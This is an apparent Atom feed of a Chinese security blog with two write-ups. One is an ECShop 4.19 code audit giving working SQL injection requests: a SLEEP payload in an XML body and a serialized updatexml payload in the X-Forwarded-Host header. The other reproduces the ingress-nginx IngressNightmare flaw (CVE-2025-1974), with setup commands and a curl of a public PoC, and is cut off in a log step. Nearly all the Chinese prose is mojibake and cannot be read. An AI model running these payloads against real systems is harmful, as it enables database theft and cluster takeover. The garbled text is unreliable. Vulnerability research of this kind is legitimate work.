<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xsheep</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-11-17T15:58:46.398Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Xsheep</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ecshop4.19ä»£ç å®¡è®¡</title>
    <link href="http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2025/11/17/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81Ecshop%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-11-17T15:45:35.047Z</published>
    <updated>2025-11-17T15:58:46.398Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ç‰ˆæœ¬</strong> ï¼šv4.19</p><p>å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜ï¼Œç½‘ä¸Šå¤§å¤šéƒ½ä¸å…¬å¼€pocï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„åˆ†æè¿‡ç¨‹</p><h2 id="å®‰å…¨æœºåˆ¶"><a href="#å®‰å…¨æœºåˆ¶" class="headerlink" title="å®‰å…¨æœºåˆ¶"></a>å®‰å…¨æœºåˆ¶</h2><p>å»ç½‘ä¸Šæœç´¢ä¸€ä¸‹å†å²æ¼æ´ä¼šå‘ç°ï¼ŒECshopè¿™å¥—ä»£ç çˆ†å‡ºè¿‡ä¸å°‘sqlæ³¨å…¥æ¼æ´</p><p><img src="/imgs/img/image-20251117222708755.png" alt="image-20251117222708755"></p><p>æ˜¯å› ä¸ºè¿™å¥—ç³»ç»Ÿå¾ˆå–œæ¬¢ç›´æ¥æŠŠå˜é‡æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼ˆçœ‹èµ·æ¥å·²ç»è¢«å„ä½å¸ˆå‚…å®¡çƒ‚äº†ï¼‰</p><p>ä¿®ä¿®è¡¥è¡¥ä¹‹åï¼Œå³ä½¿ç›´æ¥æ‹¼æ¥å˜é‡ï¼Œä¹Ÿä¸å¤ªå¥½æ‰¾sqlæ³¨å…¥äº†ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ä¸ªåœ°æ–¹å¢åŠ äº†å®‰å…¨æ ¡éªŒ</p><p><img src="/imgs/img/image-20251117223139960.png" alt="image-20251117223139960"></p><p>æ¯ä¸ªæ–‡ä»¶éƒ½ä¼šå¼•å…¥åŠ è½½ <code>/includes/init.php</code>ï¼Œå®‰å…¨çš„æ£€æŸ¥ä¸»è¦åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œ</p><p>è¿›å…¥<code>init.php</code>å¯ä»¥çœ‹åˆ°ï¼ŒåŠ è½½äº†ä¸€ä¸ª<code>safety.php</code></p><p><img src="/imgs/img/image-20251117223543051.png" alt="image-20251117223543051"> </p><h3 id="æ¨¡å¼åŒ¹é…"><a href="#æ¨¡å¼åŒ¹é…" class="headerlink" title="æ¨¡å¼åŒ¹é…"></a>æ¨¡å¼åŒ¹é…</h3><p>åœ¨<code>safety.php</code> é‡Œï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é…å»åŒ¹é…å±é™©æ¨¡å¼</p><p><img src="/imgs/img/image-20251117223648661.png" alt="image-20251117223648661"></p><p>ä¼šå¯¹æ¯ä¸ªä¼ å…¥çš„å˜é‡è¿›è¡Œæ ¡éªŒ</p><p><img src="/imgs/img/image-20251117223745509.png" alt="image-20251117223745509"></p><p>åŒ¹é…çš„è¾ƒä¸ºå®Œå–„ï¼Œä¸æ˜¯å¾ˆå¥½ç»•</p><p>å¹¶ä¸”åœ¨æ­£åˆ™åŒ¹é…è¿‡åï¼Œè¿˜ä¼šåœ¨<code>init.php</code>é‡Œå¯¹ä¼ å…¥å˜é‡è¿›è¡Œè½¬ä¹‰</p><p><img src="/imgs/img/image-20251117224018264.png" alt="image-20251117224018264"></p><p>æ­£åˆ™åŒ¹é… +  è½¬ä¹‰ï¼Œçœ‹èµ·æ¥å·²ç»æ— æ³•sqlæ³¨å…¥äº†ï¼Œæ¥ä¸‹æ¥çœ‹å„ä½å¤§å“¥å¦‚ä½•ç»•è¿‡</p><h2 id="SQLæ³¨å…¥-1"><a href="#SQLæ³¨å…¥-1" class="headerlink" title="SQLæ³¨å…¥-1"></a>SQLæ³¨å…¥-1</h2><p>å…ˆæ”¾poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=wechat_token HTTP/2</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Cookie: ECS[visit_times]=3; ECS_ID=591272e1d0fd2ee9027c0d7ab0d8922e92035a0d</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Origin: https://www.xjhao.com.cn</span><br><span class="line">Referer: https://www.xjhao.com.cn/user.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Length: 195</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;Event&gt;scan&lt;/Event&gt;</span><br><span class="line">    &lt;EventKey&gt;&#x27; AND (SELECT 1649 FROM (SELECT(SLEEP(5)))nsIj) AND &#x27;RKvz&#x27;=&#x27;RKvz&lt;/EventKey&gt;</span><br><span class="line">    &lt;FromUserName&gt;123456&lt;/FromUserName&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/imgs/img/image-20251117224438068.png" alt="image-20251117224438068"></p><p>æ ¹æ®pocå¯ä»¥çŸ¥é“ï¼Œ<code>user.php</code>çš„<code>wechat_token</code>æ¥å£çš„æ¼æ´ï¼Œçœ‹ä»£ç </p><p><img src="/imgs/img/image-20251117224612949.png" alt="image-20251117224612949"></p><p>å®ä¾‹åŒ–ä¸€ä¸ª<code>WeChatEvent</code> â€”&gt;  ç”¨phpä¼ªåè®®æ‹¿åˆ°è¯·æ±‚ä½“  â€”-&gt; ç„¶åxmlè½¬ä¸ºå­—ç¬¦ä¸²  â€”â€“&gt; æœ€åç”¨<code>call_user_func</code>å»è°ƒç”¨æ–¹æ³•<br>æ³¨æ„åˆ°ä¸¤ç‚¹ï¼Œ1. ä½¿ç”¨phpä¼ªåè®®ï¼Œå¯¼è‡´ä¼ å…¥çš„å‚æ•°å¹¶æ²¡æœ‰è½¬ä¹‰ï¼Œä¹Ÿä¸ä¼šè¢«æ£€æµ‹ï¼Œä¹‹å‰çš„æ£€æµ‹å…¨éƒ¨é’ˆå¯¹äºgetå’Œpostä¼ å‚</p><p>2.<code>call_user_func_array</code> çš„æ–¹æ³•åå’Œæ•°æ®æ˜¯ç”¨æˆ·å¯æ§</p><p>ç„¶åå»çœ‹<code>WeChatEvent</code>ç±»</p><p><img src="/imgs/img/image-20251117225151828.png" alt="image-20251117225151828"></p><p>å…¨éƒ¨æ˜¯ç›´æ¥æ‹¼æ¥ï¼Œæœ€åå¯¼è‡´æ³¨å…¥</p><h2 id="SQLæ³¨å…¥-2"><a href="#SQLæ³¨å…¥-2" class="headerlink" title="SQLæ³¨å…¥-2"></a>SQLæ³¨å…¥-2</h2><p>å·²çŸ¥å¤§é‡å­˜åœ¨å˜é‡ç›´æ¥æ‹¼æ¥sqlè¯­å¥ï¼Œä¸Šé¢æ˜¯åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œçš„ç»•è¿‡ï¼Œè¿™é‡Œç¬¬äºŒå¤„åˆ©ç”¨çš„æ˜¯httpè¯·æ±‚å¤´<br>æ³¨å…¥ä½ç½®åœ¨ <code>user.php</code> çš„<code>collection_list</code> æ¥å£</p><p>è¿™ä¸ªæ˜¯åœ¨ 2.X&#x2F;3.X å°±çˆ†å‡ºæ¥çš„ï¼Œåªæ˜¯æ‹¿å…ˆå‰ç‰ˆæœ¬çš„æ‰“ä¸é€šï¼Œä½†æ˜¯åªéœ€ç®€å•ä¿®æ”¹å°±èƒ½ä½¿ç”¨ï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºç‰ˆæœ¬ä¸åŒå¯¼è‡´çš„ehashä¸åŒç½¢äº†ğŸ¤ªï¼‰</p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=collection_list HTTP/2</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Cookie: ECS[visit_times]=3; ECS_ID=591272e1d0fd2ee9027c0d7ab0d8922e92035a0d; ECSCP_ID=4b2401b5af4843a95a7e19b45f5acb32ec20802b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: https://www.xjhao.com.cn/user.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-Host: 145ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|145ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url() --&gt; get_domain()æ›¿æ¢å˜é‡ --&gt; display() --&gt; insert_mod() è¿™é‡Œåˆ†å‰²å‚æ•° --&gt; æœ€åå˜é‡æ‹¼æ¥sqlè¯­å¥</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹<code>insert_mod</code>æ–¹æ³•<br><img src="/imgs/img/image-20251117230742066.png" alt="image-20251117230742066"></p><p>å¯¹ä¼ å…¥çš„å‚æ•° ä»¥<code>|</code>åˆ†å‰²ï¼Œç„¶åè°ƒç”¨å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä»»æ„è°ƒç”¨<code>insert_</code>å¼€å¤´çš„æ–¹æ³•ï¼Œå‚æ•°ä¹Ÿæ˜¯ç”±æˆ‘ä»¬å®š<br>æ‰€ä»¥å»æ‰¾æ»¡è¶³æ¡ä»¶çš„å‡½æ•°<br><img src="/imgs/img/image-20251117230918937.png" alt="image-20251117230918937"></p><p>åœ¨<code>lib_clips.php</code>é‡Œå°±æœ‰è¿™ä¹ˆä¸€ä¸ªå‡½æ•°</p><p><code>collection_list</code> æ¥å£ä¹Ÿä¼šåŒ…å«è¿™ä¸ªæ–‡ä»¶</p><p><img src="/imgs/img/image-20251117231044074.png" alt="image-20251117231044074"></p><p>æ¥ä¸‹æ¥çœ‹urlæ–¹æ³•</p><p>è§¦å‘<code>get_domain</code></p><p><img src="/imgs/img/image-20251117231140953.png" alt="image-20251117231140953"></p><p><code>get_domain</code>ä¼šæŠŠhttpè¯·æ±‚å¤´ä¸­çš„<code>HTTP_X_FORWARDED_HOST</code>èµ‹å€¼ç»™<code>$host</code>, ç„¶åè¿”å›</p><p><img src="/imgs/img/image-20251117231440342.png" alt="image-20251117231440342"></p><p>smartyæ³¨å†Œï¼Œè¿”å›çš„hostè¢«æ³¨å†Œè¿›æ¨¡æ¿å˜é‡</p><p><img src="/imgs/img/image-20251117231503425.png" alt="image-20251117231503425"></p><p>æœ€ååœ¨displayå‡½æ•°é‡Œè§¦å‘sinkç‚¹ï¼Œå®Œæˆé—­ç¯</p><p>æ‰€ä»¥æœ€åçš„æµç¨‹å°±æ˜¯ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url() --&gt; get_domain()æ›¿æ¢å˜é‡ --&gt; assignæ³¨å†Œå˜é‡--&gt; displayçš„æ—¶å€™å¯¹å˜é‡è¿›è¡Œå¤„ç†ï¼Œè§¦å‘insert_mod()  --&gt; insert_mod è¿™é‡Œåˆ†å‰²å‚æ•°ï¼Œè°ƒç”¨ç”¨æˆ·è®¾å®šå¥½çš„å‡½æ•°å’Œå‚æ•° --&gt; æœ€åè°ƒç”¨å‡½æ•°ï¼Œä¼ å…¥å‚æ•°æ‹¼æ¥sqlè¯­å¥</span><br></pre></td></tr></table></figure><p><img src="/imgs/img/aa6e087f479c0cc395f24417c6fa08e.png" alt="aa6e087f479c0cc395f24417c6fa08e"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;ç‰ˆæœ¬&lt;/strong&gt; ï¼šv4.19&lt;/p&gt;
&lt;p&gt;å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜ï¼Œç½‘ä¸Šå¤§å¤šéƒ½ä¸å…¬å¼€pocï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹æˆ‘çš„åˆ†æè¿‡ç¨‹&lt;/p&gt;
&lt;h2 id=&quot;å®‰å…¨æœºåˆ¶&quot;&gt;&lt;a href=&quot;#å®‰å…¨æœºåˆ¶&quot; class=&quot;headerlink&quot; title=&quot;å®‰å…¨æœºåˆ¶&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IngressNightmareæ¼æ´é›†ç¾¤å¤ç°</title>
    <link href="http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-27T14:21:44.451Z</published>
    <updated>2025-03-27T14:21:23.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2025-1974å¤ç°"><a href="#CVE-2025-1974å¤ç°" class="headerlink" title="CVE-2025-1974å¤ç°"></a>CVE-2025-1974å¤ç°</h2><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>Ingress Nginx Controller æ˜¯ K8s ä¸Šæœ€å—æ¬¢è¿çš„ Ingress æ§åˆ¶å™¨ä¹‹ä¸€ï¼Œæœ‰æƒè®¿é—® ingress-nginx å‡†å…¥æ§åˆ¶å™¨ webhook çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºæ¶æ„çš„ ingress-nginx Ingress é…ç½®ï¼Œä»è€Œå¯¼è‡´ RCE</p><h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>å½“Ingress Nginx Controllerå¤„ç†ä¼ å…¥çš„ AdmissionReviewè¯·æ±‚æ—¶ï¼Œå®ƒä¼šæ ¹æ®æ¨¡æ¿æ–‡ä»¶å’Œæä¾›çš„ Ingress å¯¹è±¡ç”Ÿæˆä¸€ä¸ªä¸´æ—¶ NGINX é…ç½®æ–‡ä»¶ã€‚ç„¶åï¼Œå®ƒä½¿ç”¨ <code>nginx -t</code>å‘½ä»¤æµ‹è¯•ä¸´æ—¶é…ç½®æ–‡ä»¶çš„æœ‰æ•ˆæ€§ã€‚</p><p>é—®é¢˜å…³é”®ç‚¹æœ‰ä¸‰ä¸ªï¼Œè°å¯ä»¥å‘é€AdmissionReviewè¯·æ±‚ï¼Ÿï¼Œå¦‚ä½•æ³¨å…¥æ¶æ„NGINXé…ç½®æ–‡ä»¶ï¼Ÿï¼Œå¦‚ä½•åˆ©ç”¨nginx -t å‘½ä»¤æ‰§è¡Œrceï¼Ÿ</p><p>å¯¹äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œé€šå¸¸ï¼Œåªæœ‰ Kubernetes API æœåŠ¡å™¨åº”è¯¥å‘é€è¿™äº› AdmissionReview è¯·æ±‚ã€‚ä½†æ˜¯ï¼Œç”±äº Admission Controller ç¼ºå°‘èº«ä»½éªŒè¯ï¼Œå› æ­¤å…·æœ‰æœ€å°ç½‘ç»œè®¿é—®æƒé™çš„æ”»å‡»è€…å¯ä»¥ä»é›†ç¾¤å†…çš„ä»»ä½• Pod æ„å»ºå¹¶å‘é€ä»»æ„ AdmissionReview è¯·æ±‚ã€‚</p><p>ç¬¬äºŒä¸ªé—®é¢˜ï¼ŒCVE-2025-1974æ¼æ´æ˜¯IngressNightmareæ¼æ´é›†ç¾¤ä¸­çš„ä¸€ä¸ªï¼Œä¸å…¶åŒæ—¶çˆ†å‡ºçš„CVE-2025-24514ï¼ŒCVE-2025-1097ï¼ŒCVE-2025-1098çš†ä¸ºè¿œç¨‹NGINXé…ç½®æ³¨å…¥ï¼Œå¯åˆ©ç”¨è¿™ä¸‰ä¸ªæ¼æ´å®ç°æ³¨å…¥ä»»æ„ NGINX é…ç½®æŒ‡ä»¤ã€‚</p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜ï¼ŒIngress Nginx Controller ä¸­æœ‰è®¸å¤šå¯ç”¨çš„æŒ‡ä»¤ï¼Œ<code>ssl_engine</code> æŒ‡ä»¤æ˜¯ OpenSSL æ¨¡å—çš„ä¸€éƒ¨åˆ†ï¼Œè¿™ä¸ªæŒ‡ä»¤å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­çš„ä»»ä½•ä½ç½®ä½¿ç”¨ï¼Œä»¥åœ¨ NGINX é…ç½®æµ‹è¯•é˜¶æ®µåŠ è½½ä»»æ„åº“æ–‡ä»¶ã€‚æ­¤æ—¶å‡ºç°ç¬¬å››ä¸ªé—®é¢˜ï¼Œå¦‚ä½•ä¸Šä¼ æ¶æ„å…±äº«åº“æ–‡ä»¶ï¼Ÿ</p><p>å¦‚æœ HTTP è¯·æ±‚æ­£æ–‡å¤§å°å¤§äºç‰¹å®šé˜ˆå€¼ï¼ˆé»˜è®¤ä¸º8KBï¼‰æ—¶ï¼ŒNGINX æœ‰æ—¶ä¼šå°†è¯·æ±‚ä½“ä¿å­˜åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå°†è¯·æ±‚ä¸­çš„æ ‡å¤´è®¾ç½®ä¸ºå¤§äºå®é™…å†…å®¹å¤§å°ã€‚NGINX ä¼šä¸€ç›´ç­‰å¾…å‘é€æ›´å¤šæ•°æ®ï¼Œè¿™ä¼šå¯¼è‡´è¿›ç¨‹æŒ‚èµ·ï¼Œè®©æ–‡ä»¶æè¿°ç¬¦æ‰“å¼€çš„æ—¶é—´æ›´é•¿ï¼Œé€šè¿‡éå†çˆ†ç ´ PID å’Œ FD ç¼–å·ï¼Œæ‰¾åˆ°æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯¹æ¶æ„å…±äº«åº“è¿›è¡ŒåŠ è½½ã€‚</p><h3 id="æ¼æ´ä»£ç "><a href="#æ¼æ´ä»£ç " class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h3><p>ingress-nginx&#x2F;internal&#x2F;ingress&#x2F;controller&#x2F;controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content, err := n.generateTemplate(cfg, *pcfg)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">n.metricCollector.IncCheckErrorCount(ing.ObjectMeta.Namespace, ing.Name)</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = n.testTemplate(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">n.metricCollector.IncCheckErrorCount(ing.ObjectMeta.Namespace, ing.Name)</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generateTemplateå‡½æ•°ç”Ÿæˆcfgæ–‡ä»¶ï¼ŒtestTemplateå‡½æ•°è¿›è¡Œé…ç½®æµ‹è¯•</p><p>testTemplateå‡½æ•°å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *NGINXController)</span></span> testTemplate(cfg []<span class="type">byte</span>) <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cfg) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid NGINX configuration (empty)&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">tmpfile, err := os.CreateTemp(filepath.Join(os.TempDir(), <span class="string">&quot;nginx&quot;</span>), tempNginxPattern)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> tmpfile.Close()</span><br><span class="line">err = os.WriteFile(tmpfile.Name(), cfg, file.ReadWriteByUser)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">out, err := n.command.Test(tmpfile.Name())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// this error is different from the rest because it must be clear why nginx is not working</span></span><br><span class="line">oe := fmt.Sprintf(<span class="string">`</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Error: %v</span></span><br><span class="line"><span class="string">%v</span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">`</span>, err, <span class="type">string</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> errors.New(oe)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">os.Remove(tmpfile.Name())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨testTemplateå‡½æ•°è°ƒç”¨Testå‡½æ•°ï¼ŒTestå‡½æ•°ä»£ç å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(nc NginxCommand)</span></span> Test(cfg <span class="type">string</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">//nolint:gosec // Ignore G204 error</span></span><br><span class="line"><span class="keyword">return</span> exec.Command(nc.Binary, <span class="string">&quot;-c&quot;</span>, cfg, <span class="string">&quot;-t&quot;</span>).CombinedOutput()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ä½¿ç”¨minikubeæ­å»ºç¯å¢ƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64</span><br><span class="line"></span><br><span class="line">sudo install minikube-linux-amd64 /usr/local/bin/minikube</span><br></pre></td></tr></table></figure><p>å¯åŠ¨minickube (åœ¨è¿™é‡Œå¯èƒ½ä¼šå‡ºç°å¾ˆå¤šæŠ¥é”™ï¼Œå¯æ ¹æ®å…·ä½“åŸå› è§£å†³ï¼Œæ­¤å¤„çœç•¥)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minikube start</span><br></pre></td></tr></table></figure><p>å®‰è£…å—æ¼æ´å½±å“ç‰ˆæœ¬çš„ingress-nignx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.11.2/deploy/static/provider/cloud/deploy.yaml</span><br><span class="line"></span><br><span class="line">#ä¸‹é¢ä¸¤æ¡å‘½ä»¤ç”¨äºæ¢æº</span><br><span class="line">sed -i &#x27;s#registry.k8s.io/ingress-nginx/controller:v1.11.2@sha256:d5f8217feeac4887cb1ed21f27c2674e58be06bd8f5184cacea2a69abaf78dce#registry.aliyuncs.com/google_containers/nginx-ingress-controller:v1.11.2#g&#x27; deploy.yaml</span><br><span class="line"> </span><br><span class="line">sed -i &#x27;s#registry.k8s.io/ingress-nginx/kube-webhook-certgen:v1.4.3@sha256:a320a50cc91bd15fd2d6fa6de58bd98c1bd64b9a6f926ce23a600d87043455a3#registry.aliyuncs.com/google_containers/kube-webhook-certgen:v1.4.3#g&#x27; deploy.yaml</span><br><span class="line"></span><br><span class="line"># å®‰è£…</span><br><span class="line">kubectl apply -f deploy.yaml</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹å¯åŠ¨çš„validating webhookç›‘å¬åœ¨8443ç«¯å£ ï¼Œç”¨putforwardå‘½ä»¤è¿›è¡Œç«¯å£è½¬å‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl port-forward -n ingress-nginx ingress-nginx-controller-76c86b6bbd-s86qn 2333:8443</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç½‘ä¸Šçš„Pocè¿›è¡ŒéªŒè¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gir clone https://github.com/sandumjacob/IngressNightmare-POCs</span><br><span class="line">cd ./CVE-2025-1974</span><br><span class="line">curl --insecure -v -H &quot;Content-Type: application/json&quot; --data @poc.json https://localhost:2333/123</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs ingress-nginx-controller-76c86b6bbd-s86qn -n ingress-nginx</span><br></pre></td></tr></table></figure><p>å‡ºç°ä»¥ä¸‹è¯­å¥ï¼Œè¯´æ˜éªŒè¯äº†ä¸Šä¼ çš„nginxé…ç½®ï¼Œå³å­˜åœ¨æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 